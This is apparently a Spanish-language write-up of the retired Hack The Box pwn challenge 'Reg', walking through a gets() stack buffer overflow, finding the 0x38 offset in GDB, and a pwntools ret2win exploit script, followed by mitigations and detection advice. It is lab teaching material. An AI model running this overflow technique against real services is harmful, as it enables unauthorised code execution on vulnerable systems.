---
challenge: Reg
category: Challenge
type: pwn
os: Linux
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [pwn, buffer-overflow, ret2win, x86-64, pwntools, gdb]
---

# Reg — Hack The Box (Challenge)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de método; sin flags ni credenciales reales.

## TL;DR

Reto de desbordamiento de pila de manual. `run()` lee el nombre con `gets()` en un búfer de `0x30` bytes, así que 56 bytes llenan el marco y los 8 siguientes pisan el puntero de retorno. El binario no es PIE y trae una función `winner()` que abre `flag.txt`, la lee y la imprime: no hace falta shellcode ni ROP, solo devolver la ejecución a esa dirección fija.

## Enunciado y superficie

- Categoría **Pwn**, dificultad **Easy**, binario ELF x86-64 descargable y una instancia remota por `nc`.
- Entrega el binario `reg` sin `strip`, así que los símbolos están disponibles.
- El enunciado no da pistas técnicas: es el típico "regístrate" con un campo de nombre.

```bash
file reg
checksec --file=reg
```

```text
ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE
```

## Reconocimiento

```bash
chmod +x reg
./reg
```

```text
Enter your name: test
Registered!
```

Sin menús ni opciones: un único `read` de stdin y un mensaje. El resto hay que verlo en el desensamblado.

```bash
nm -C reg | grep -iE " (run|winner)$"
objdump -d -M intel reg | sed -n '/<run>:/,/^$/p'
```

## Análisis del código

`run()` reserva `0x30` bytes y llama a `gets` con el búfer:

```asm
<run>:
  push   rbp
  mov    rbp,rsp
  sub    rsp,0x30
  lea    rdi,[rip+...]        ; "Enter your name: "
  call   puts
  lea    rax,[rbp-0x30]
  mov    rdi,rax
  call   gets                 ; sin límite de longitud
  lea    rdi,[rip+...]        ; "Registered!"
  call   puts
  leave
  ret
```

`gets` no conoce el tamaño del destino y sigue leyendo hasta el salto de línea: es la vulnerabilidad, y está alcanzable sin autenticación porque es la única entrada del programa.

Aparte existe `winner()`, que no se llama desde ningún sitio:

```asm
<winner>:
  ...
  lea    rdi,[rip+...]        ; "Congratulations!"
  call   puts
  lea    rsi,[rip+...]        ; "r"
  lea    rdi,[rip+...]        ; "flag.txt"
  call   fopen
  ...
  call   fgets
  call   puts
```

## Explicación del fallo

El marco de `run()` queda así:

```text
rbp-0x30  [ búfer de 48 bytes ]   <- gets escribe aquí sin límite
rbp+0x00  [ saved RBP, 8 bytes ]  <- se pisa con 8 bytes más
rbp+0x08  [ return address    ]   <- siguiente objetivo
```

Con `0x30` bytes se llena el búfer; con 8 más se sobrescribe el `saved RBP`; los 8 siguientes van al puntero de retorno. Al ejecutar `ret`, el programa salta a la dirección que se haya escrito.

No hay canario que lo detecte, no hay PIE que obligue a filtrar direcciones y `winner()` ya está en el binario: la técnica se llama **ret2win** y aquí es el camino previsto, no un atajo.

## Reproducción local

```bash
gdb -q ./reg
```

```gdb
gef> pattern create 200
gef> run
# pegar el patrón en "Enter your name"
gef> pattern search $rsp
```

El desplazamiento sale `0x38` (48 del búfer + 8 del `saved RBP`). Para confirmar la dirección de la función:

```bash
objdump -d reg | grep "<winner>:"      # 0x401206
```

Alternativa sin GDB, con el binario y `pwntools`:

```python
from pwn import *
context.binary = elf = ELF('./reg')
p = process('./reg')
p.sendlineafter(b':', cyclic(200))
p.wait()
offset = cyclic_find(p.corefile.read(p.corefile.rsp, 4))
print(hex(offset), hex(elf.symbols['winner']))
```

## Explotación

```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./reg')
HOST, PORT = '<IP>', <PORT>

payload  = b'A' * 0x30        # búfer
payload += b'B' * 0x8         # saved RBP
payload += p64(elf.symbols['winner'])

p = remote(HOST, PORT)
p.sendlineafter(b':', payload)
print(p.recvall(timeout=5).decode(errors='replace'))
```

Puntos que hay que respetar:

- `p64` escribe el entero en **little endian**; a mano serían los bytes `06 12 40 00 00 00 00 00`.
- El salto a `winner()` necesita la pila alineada a 16 bytes. Si el `ret` revienta con un `movaps`, se antepone un `ret` (`p64(rop.ret.address)`) antes de la dirección.
- En remoto el offset no cambia porque el binario es idéntico; si se recompilara, habría que recalcularlo.

La prueba de ejecución es el mensaje de `winner()` seguido del contenido de `flag.txt`.

## Evidencia

- `checksec` con `NX enabled` y `No PIE`.
- Patrón de `cyclic` y el offset `0x38` en GDB.
- Salida del exploit local con una flag de prueba, nunca la real.

## Lecciones aprendidas

- `gets` no es "peligroso en abstracto": quita el límite y convierte cualquier búfer en un desbordamiento trivial.
- El `saved RBP` ocupa 8 bytes entre el búfer y el retorno; olvidarlo desplaza el payload y el salto falla con una dirección basura.
- Antes de montar un ROP conviene listar los símbolos: una función que imprime la flag ahorra toda la cadena.
- `p64` y `cyclic_find` eliminan los errores de endianness y de cálculo de offset.
- Si `movaps` aparece al saltar a una función de libc, es alineación de pila, no un payload mal escrito.

## Mitigaciones y detección

- Sustituir `gets` por `fgets` con el tamaño del búfer (o `getline`); `gets` se eliminó de C11 precisamente por esto.
- Compilar con `-fstack-protector-strong`, `-pie -fPIE` y `-Wl,-z,relro,-z,now`; con canario y PIE el ret2win deja de ser trivial.
- No dejar funciones de depuración que impriman ficheros sensibles en el binario distribuido.
- Detección en un servicio real: caídas del proceso con `SIGSEGV` y `RIP` apuntando a una dirección del propio binario, peticiones con cadenas cíclicas (`Aa0Aa1...`) ycores repetidos en el mismo endpoint.
- Referencias: CWE-121 (stack-based buffer overflow), MITRE T1190 (exploit public-facing application).

## Referencias

- <https://www.hackthebox.com/challenges/reg>
- <https://blackfell.net/technical/labs/HTB-pwn-reg>
- <https://cwe.mitre.org/data/definitions/121.html>
- <https://docs.pwntools.com/en/stable/elf/elf.html>
- <https://man7.org/linux/man-pages/man3/gets.3.html>
